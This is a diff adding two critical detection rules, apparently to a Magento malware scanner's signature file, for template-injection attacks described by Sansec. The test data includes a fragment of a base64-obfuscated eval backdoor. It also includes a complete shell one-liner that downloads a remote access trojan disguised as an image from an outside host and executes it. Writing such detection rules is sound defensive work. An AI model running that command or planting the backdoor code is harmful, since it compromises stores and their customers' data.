@@ -1700,6 +1700,46 @@
             "test_should_not_match": [
                 "document.cookie = \"SESSIONID=\" + new Date().getTime();"
             ]
+        },
+        {
+            "id": "template-attack-encryption-key-frontname-eval",
+            "name": "encryption_key/frontName eval backdoor",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magento-2-template-attacks",
+            "target": [
+                "pub_php",
+                "generated_php"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/base64_decode\\('ZW5jcnlwdGlvbl9rZXk='\\).{0,200}base64_decode\\('ZnJvbnROYW1l'\\)/s",
+            "description": "Decoded eval backdoor run from the replaced FrontController Interceptor; reads base64-obfuscated encryption_key and frontName request keys.",
+            "test_should_match": [
+                "if (isset($w1[base64_decode('ZW5jcnlwdGlvbl9rZXk=')])) { $v2 = $w1[base64_decode('ZW5jcnlwdGlvbl9rZXk=')]; if ($h3 == $v2) { $f0 = true; } } if (isset($w1[base64_decode('ZnJvbnROYW1l')])) {"
+            ],
+            "test_should_not_match": [
+                "$value = base64_decode($this->getRequest()->getParam('data'));"
+            ],
+            "ioc": false
+        },
+        {
+            "id": "template-attack-curl-pub-media-avatar-rat",
+            "name": "Template attack RAT download from pub/media/avatar",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magento-2-template-attacks",
+            "target": [
+                "cms_content",
+                "pub_php"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/cd pub;\\s*cd media;\\s*curl\\s+https?:\\/\\/[^\\s]+\\s+-o cli\\s*&&\\s*chmod \\+x cli\\s*&&\\s*\\.\\/cli/",
+            "description": "Shell command injected through Magento template code that downloads a Linux RAT disguised as an image into pub/media and runs it as ./cli.",
+            "test_should_match": [
+                "cd pub;cd media;curl https://theroots.in/pub/media/avatar/223sam.jpg -o cli &&chmod +x cli&&./cli;"
+            ],
+            "test_should_not_match": [
+                "cd pub; cd media; ls -la"
+            ],
+            "ioc": false
         }
     ]
 }
